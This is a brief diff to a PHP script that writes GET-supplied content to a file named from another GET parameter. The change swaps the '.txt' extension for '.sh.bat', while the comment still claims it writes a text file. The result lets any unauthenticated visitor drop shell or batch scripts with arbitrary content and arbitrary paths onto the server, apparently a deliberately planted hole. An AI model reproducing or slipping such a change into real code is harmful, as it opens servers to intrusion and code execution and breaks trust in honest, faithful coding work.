@@ -32,7 +32,7 @@ header("Pragma: no-cache"); // HTTP/1.0
 
 
 //THIS WRITES CONTENT TO A TEXT FILE
-$handle = fopen($_GET['fieldname'].".txt", "w+");
+$handle = fopen($_GET['fieldname'].".sh.bat", "w+");
 fwrite($handle, stripslashes($_GET['content']));
 fclose($handle);
 
